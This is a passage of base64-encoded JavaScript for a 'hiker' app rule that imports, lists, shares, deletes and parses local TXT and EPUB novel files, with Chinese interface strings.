0b3BhdGggPSBDb25maWcuZXh0ZXJuYWxJbXBvcnRQYXRoICsgbm92ZWxOYW1lICsgZmlsZU1hdGNoWzJdO1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdG9wYXRoQ2FjaGUgPSBDb25maWcuY29udGVudHNDYWNoZSArIG5vdmVsTmFtZSArIGZpbGVNYXRjaFsyXTtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHBhdGggPSBpbnB1dC5yZXBsYWNlKFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYgKGZpbGVFeGlzdChcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIHRvcGF0aCkpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZpcm0oe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuWvvOWFpeaPkOekulxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnQ6IFxcXFxcXFwi5bey5a2Y5ZyoW1xcXFxcXFwiICsgbm92ZWxOYW1lICsgXFxcXFxcXCJd5piv5ZCm6KaG55uWP1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZpcm06ICQudG9TdHJpbmcoKHBhdGgsIHRvcGF0aCwgdG9wYXRoQ2FjaGUpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGaWxlLmNvcHlGaWxlKHBhdGgsIHRvcGF0aCwgdHJ1ZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChmaWxlRXhpc3QoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyB0b3BhdGhDYWNoZSkpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZpbGUuZGVsZXRlRmlsZXModG9wYXRoQ2FjaGUpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/lr7zlhaXmiJDlip9cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCBwYXRoLCB0b3BhdGgsIHRvcGF0aENhY2hlKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47XFxcXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBGaWxlLmNvcHlGaWxlKHBhdGgsIHRvcGF0aCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZmlsZUV4aXN0KFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiICsgdG9wYXRoQ2FjaGUpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5kZWxldGVGaWxlcyh0b3BhdGhDYWNoZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0b2FzdChcXFxcXFxcIuWvvOWFpeaIkOWKn1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjtcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcmVxdWlyZVVybCA9IFxcXFxcXFwiaHR0cDovL2hpa2VyLm5va2lhLnByZXNzL2hpa2VydWxlL3J1bGVsaXN0Lmpzb24/aWQ9NTA5OVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgIGxldCBmaWxlU2VsZWN0ID0gJC5yZXF1aXJlKHJlcXVpcmVVcmwpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBmaWxlU2VsZWN0LmZpbGVTZWxlY3Rpb25Vcmkoe1xcXFxuICAgICAgICAgICAgICAgICAgICBjYWxsYmFjazogJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGZpbGVNYXRjaCA9IFBBVEgubWF0Y2goL1xcXFxcXFxcLyhbXlxcXFxcXFxcL10qPykoXFxcXFxcXFwudHh0fFxcXFxcXFxcLmVwdWIpJC9pKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBub3ZlbE5hbWUgPSBmaWxlTWF0Y2hbMV07XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgdG9wYXRoID0gQ29uZmlnLmV4dGVybmFsSW1wb3J0UGF0aCArIG5vdmVsTmFtZSArIGZpbGVNYXRjaFsyXTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB0b3BhdGhDYWNoZSA9IENvbmZpZy5jb250ZW50c0NhY2hlICsgbm92ZWxOYW1lICsgZmlsZU1hdGNoWzJdO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBhdGggPSBQQVRIO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGZpbGVFeGlzdChcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIHRvcGF0aCkpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJChcXFxcXFxcIuW3suWtmOWcqFtcXFxcXFxcIiArIG5vdmVsTmFtZSArIFxcXFxcXFwiXeaYr+WQpuimhueblj9cXFxcXFxcIikuY29uZmlybSgocGF0aCwgdG9wYXRoLCB0b3BhdGhDYWNoZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZpbGUuY29weUZpbGUocGF0aCwgdG9wYXRoLCB0cnVlKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGZpbGVFeGlzdChcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIHRvcGF0aENhY2hlKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5kZWxldGVGaWxlcyh0b3BhdGhDYWNoZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYmFjaygpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+WvvOWFpeaIkOWKn1xcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIHBhdGgsIHRvcGF0aCwgdG9wYXRoQ2FjaGUpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5jb3B5RmlsZShwYXRoLCB0b3BhdGgpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChmaWxlRXhpc3QoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyB0b3BhdGhDYWNoZSkpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5kZWxldGVGaWxlcyh0b3BhdGhDYWNoZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJhY2soKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+WvvOWFpeaIkOWKn1xcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICB9KSxcXFxcbiAgICAgICAgICAgICAgICAgICAgZmlsZVR5cGU6IFxcXFxcXFwiLnR4dHwuZXB1YlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBvbkNsaWNrVHlwZTogXFxcXFxcXCJjb25maXJtXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIHN0b3JlOiBcXFxcXFxcInNlbGVjdFBhdGhDYWNoZTFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgbWVtb3J5UGF0aDogdHJ1ZVxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KSxcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG4gICAgbGV0IG9wdGlvbnMgPSBbXFxcXFxcXCLpmIXor7tcXFxcXFxcIiwgXFxcXFxcXCLliIbkuqtcXFxcXFxcIiwgXFxcXFxcXCLliKDpmaRcXFxcXFxcIiwgXFxcXFxcXCLmiZPlvIDmlrnlvI9cXFxcXFxcIl07XFxcXG5cXFxcbiAgICBsZXQgcGF0dGVybiA9IGdldE15VmFyKFxcXFxcXFwiOnR4dFBhdHRlcm5cXFxcXFxcIiwgb3B0aW9uc1swXSk7XFxcXG4gICAgbGV0IGlkID0gRGF0ZS5ub3coKSArIFxcXFxcXFwiOuaooeW8j1xcXFxcXFwiO1xcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IHBhdHRlcm4sXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfM1xcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQob3B0aW9ucywgMSwgXFxcXFxcXCLmk43kvZzmqKHlvI9cXFxcXFxcIikuc2VsZWN0KChpZCkgPT4ge1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCI6dHh0UGF0dGVyblxcXFxcXFwiLCBpbnB1dCk7XFxcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKGlkLCB7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGlucHV0XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfSwgaWQpLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgaWQ6IGlkXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuaWh+S7tueuoeeQhlxcXFxcXFwiLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzNcXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlTWFuYWdlbWVudC52aWV3I25vUmVmcmVzaCMjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjP3R5cGU9ZXh0ZXJuYWxJbXBvcnRQYXRoXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVfYmxhbmtcXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxuXFxcXG4gICAgZnVuY3Rpb24gb3BlcmF0aW9uKHBhdGgsIG5hbWUsIHR5cGUpIHtcXFxcbiAgICAgICAgbGV0IHBhdHRlcm4gPSBnZXRNeVZhcihcXFxcXFxcIjp0eHRQYXR0ZXJuXFxcXFxcXCIsIFxcXFxcXFwi6ZiF6K+7XFxcXFxcXCIpO1xcXFxuICAgICAgICBzd2l0Y2ggKHBhdHRlcm4pIHtcXFxcbiAgICAgICAgICAgIGNhc2UgXFxcXFxcXCLliIbkuqtcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJzaGFyZTovL1xcXFxcXFwiICsgcGF0aDtcXFxcbiAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgIGNhc2UgXFxcXFxcXCLliKDpmaRcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJChcXFxcXFxcIuehruiupOWIoOmZpFtcXFxcXFxcIiArIG5hbWUgKyBcXFxcXFxcIl1cXFxcXFxcIikuY29uZmlybSgocGF0aCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmIChGaWxlLmRlbGV0ZUZpbGVzKHBhdGgpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZmlsZUV4aXN0KFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiICsgcGF0aCArIFxcXFxcXFwiLmpzb25cXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGaWxlLmRlbGV0ZUZpbGVzKHBhdGggKyBcXFxcXFxcIi5qc29uXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgLy9yZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlSXRlbShwYXRoKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/liKDpmaTmiJDlip9cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5Yig6Zmk5aSx6LSlXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9LCBwYXRoKTtcXFxcbiAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgIGNhc2UgXFxcXFxcXCLpmIXor7tcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gKHR5cGU9PT1cXFxcXFxcIi50eHRcXFxcXFxcIj9cXFxcXFxcImhpa2VyOi8vcGFnZS90eHRQYXJzZXIudmlld1xcXFxcXFwiOlxcXFxcXFwiaGlrZXI6Ly9wYWdlL2VwdWJQYXJzZXIudmlldyNhdXRvQ2FjaGUjXFxcXFxcXCIpK1xcXFxcXFwiP3J1bGU9XFxcXFxcXCIgKyBNWV9SVUxFLnRpdGxlO1xcXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICAgICAgY2FzZSBcXFxcXFxcIuaJk+W8gOaWueW8j1xcXFxcXFwiOlxcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcIm9wZW5GaWxlOi8vZmlsZTovL1xcXFxcXFwiICsgcGF0aDtcXFxcbiAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcblxcXFxuICAgIGZvciAobGV0IG5vdmVsIG9mIGZpbGVzKSB7XFxcXG4gICAgICAgIGxldCB0eXBlID0gbm92ZWwubmFtZS5zdWJzdHJpbmcobm92ZWwubmFtZS5sYXN0SW5kZXhPZihcXFxcXFxcIi5cXFxcXFxcIikpO1xcXFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogbm92ZWwubmFtZSxcXFxcbiAgICAgICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKG9wZXJhdGlvbiwgbm92ZWwucGF0aCwgbm92ZWwubmFtZSwgdHlwZSksXFxcXG4gICAgICAgICAgICBkZXNjOiBcXFxcXFxcIuWkp+Wwj++8mlxcXFxcXFwiICsgRmlsZS5nZXRGaWxlU2l6ZShub3ZlbC5wYXRoKSArIFxcXFxcXFwiXFxcXFxcXFxu5L+u5pS55pe26Ze077yaXFxcXFxcXCIgKyAkLmRhdGVGb3JtYXQobm92ZWwubGFzdE1vZGlmaWVkLCBcXFxcXFxcInl5eXktTU0tZGQgSEg6bW06c3NcXFxcXFxcIiksXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgcGF0aDogbm92ZWwucGF0aCxcXFxcbiAgICAgICAgICAgICAgICBpc0NhY2hlOiB0cnVlLFxcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBub3ZlbC5uYW1lLFxcXFxuICAgICAgICAgICAgICAgIGlkOiBub3ZlbC5wYXRoLFxcXFxuICAgICAgICAgICAgICAgIGxvbmdDbGljazogW3tcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5YiG5LqrXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGpzOiBKU09OLnN0cmluZ2lmeShcXFxcXFxcInNoYXJlOi8vXFxcXFxcXCIgKyBub3ZlbC5wYXRoKVxcXFxuICAgICAgICAgICAgICAgIH0sIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6ZiF6K+7XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGpzOiBKU09OLnN0cmluZ2lmeSgodHlwZT09PVxcXFxcXFwiLnR4dFxcXFxcXFwiP1xcXFxcXFwiaGlrZXI6Ly9wYWdlL3R4dFBhcnNlci52aWV3XFxcXFxcXCI6XFxcXFxcXCJoaWtlcjovL3BhZ2UvZXB1YlBhcnNlci52aWV3I2F1dG9DYWNoZSNcXFxcXFxcIikrXFxcXFxcXCI/cnVsZT1cXFxcXFxcIiArIE1ZX1JVTEUudGl0bGUpXFxcXG4gICAgICAgICAgICAgICAgfSwge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmiZPlvIDmlrnlvI9cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAganM6IEpTT04uc3RyaW5naWZ5KFxcXFxcXFwib3BlbkZpbGU6Ly9maWxlOi8vXFxcXFxcXCIgKyBub3ZlbC5wYXRoKVxcXFxuICAgICAgICAgICAgICAgIH0sIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5Yig6ZmkXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGpzOiAkLnRvU3RyaW5nKChwYXRoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJC5yZXF1aXJlKFxcXFxcXFwibG9uZ1ByZXNzLmpzXFxcXFxcXCIpLmRlbGV0ZUZpbGVGb3JUeHQocGF0aClcXFxcbiAgICAgICAgICAgICAgICAgICAgfSwgbm92ZWwucGF0aClcXFxcbiAgICAgICAgICAgICAgICB9XVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKGZpbGVzLmxlbmd0aCA9PT0gMCkge1xcXFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLorr7nva5cXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvU2V0dGluZy52aWV3I25vUmVmcmVzaCMjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgdmVyc2lvbjogTVlfUlVMRS52ZXJzaW9uXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pO1xcXFxuXFxcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnOW4ruWKqeKAneKAnVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9oZWxwLnZpZXcjbm9SZWZyZXNoIyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSM/a2V5d29yZD10eHRcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogJzxoMSBzdHlsZT1cXFxcXFxcInRleHQtYWxpZ246IGNlbnRlcjtcXFxcXFxcIj7llaXpg73msqHmnInogLY8L2gxPicsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIlxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG4gICAgc2V0UmVzdWx0KGxheW91dCk7XFxcXG59XFxcXG5cXFxcbmlmICgkLmltcG9ydFBhcmFtID09PSB1bmRlZmluZWQpIHtcXFxcbiAgICAkLmV4cG9ydHMgPSB0eHRWaWV3O1xcXFxufSBlbHNlIGlmICgkLmltcG9ydFBhcmFtID09PSBudWxsKSB7XFxcXG4gICAgc2V0UmVzdWx0KHR4dFZpZXcoW10pKTtcXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCIjdi5UWFTop6PmnpDlmahcXFwiLFxcXCJwYXRoXFxcIjpcXFwidHh0UGFyc2VyLnZpZXdcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG4oZnVuY3Rpb24oKSB7XFxcXG4gICAgY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXFxcXFwiQ29uZmlnLmpzXFxcXFxcXCIpO1xcXFxuICAgIGxldCByZWdzID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3JlZ3VsYXJDaGFwdGVyLmZcXFxcXFxcIik7XFxcXG4gICAgbGV0IHBhdGggPSBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcXFxcXCJwYXRoXFxcXFxcXCIpIHx8IFxcXFxcXFwiXFxcXFxcXCIpIHx8IE1ZX1BBUkFNUy5wYXRoO1xcXFxuICAgIGxldCBjaGFyc3QgPSBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcXFxcXCJjaGFyc3RcXFxcXFxcIikgfHwgXFxcXFxcXCJcXFxcXFxcIikgfHwgTVlfUEFSQU1TLmNoYXJzdCB8fCBcXFxcXFxcIlVURi04XFxcXFxcXCI7XFxcXG4gICAgbGV0IGlzQ2FjaGUgPSBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcXFxcXCJpc0NhY2hlXFxcXFxcXCIpIHx8IFxcXFxcXFwiXFxcXFxcXCIpIHx8IE1ZX1BBUkFNUy5pc0NhY2hlO1xcXFxuICAgIGlmICghcGF0aC5zdGFydHNXaXRoKFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiKSkge1xcXFxuICAgICAgICBwYXRoID0gXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBwYXRoO1xcXFxuICAgIH1cXFxcbiAgICBpZihNWV9QQVJBTVMudGl0bGUpe1xcXFxuICAgICAgICBzZXRQYWdlVGl0bGUoTVlfUEFSQU1TLnRpdGxlKTtcXFxcbiAgICB9ZWxzZXtcXFxcbiAgICAgICAgc2V0UGFnZVRpdGxlKCQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpLmdldE5hbWUocGF0aCkpO1xcXFxuICAgIH1cXFxcbiAgICBsZXQgbGF5b3V0ID0gW107XFxcXG4gICAgbGV0IGNoYXB0ZXJOYW1lcyA9IFtdO1xcXFxuICAgIGxldCBpbnRlcnZhbHMgPSBbXTtcXFxcbiAgICBsZXQgaGFzUHJlZmFjZSA9IGZhbHNlO1xcXFxuICAgIGxldCBjYWNoZVBhdGggPSBwYXRoLnJlcGxhY2UoQ29uZmlnLmV4dGVybmFsSW1wb3J0UGF0aCwgQ29uZmlnLmNvbnRlbnRzQ2FjaGUpO1xcXFxuICAgIGlmIChpc0NhY2hlJiZmaWxlRXhpc3QoY2FjaGVQYXRoKSkge1xcXFxuICAgICAgICB0cnkge1xcXFxuXFxcXG4gICAgICAgICAgICBsZXQgYyA9IEpTT04ucGFyc2UocmVxdWVzdChjYWNoZVBhdGgpKTtcXFxcbiAgICAgICAgICAgIGNoYXB0ZXJOYW1lcyA9IGMuY2hhcHRlck5hbWVzO1xcXFxuICAgICAgICAgICAgaW50ZXJ2YWxzID0gYy5pbnRlcnZhbHM7XFxcXG4gICAgICAgICAgICBoYXNQcmVmYWNlID0gYy5oYXNQcmVmYWNlO1xcXFxuICAgICAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIumHjeaWsOino+aekOebruW9lVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgocGF0aCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICBkZWxldGVGaWxlKHBhdGgpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgfSwgcGF0aCtcXFxcXFxcIi5qc29uXFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOmZhbHNlXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6XFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICBsb2coZS50b1N0cmluZygpKTtcXFxcbiAgICAgICAgICAgIHNldFJlc3VsdChbe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnOKAneKAnTxzdHJvbmc+55uu5b2V6Kej5p6Q5aSx6LSlKOmHjeaWsOino+aekCk8L3N0cm9uZz5cXFxcXFxcIi5iaWcoKSxcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKHBhdGgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVsZXRlRmlsZShwYXRoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgIH0sIHBhdGgrXFxcXFxcXCIuanNvblxcXFxcXFwiKSxcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9XSk7XFxcXG4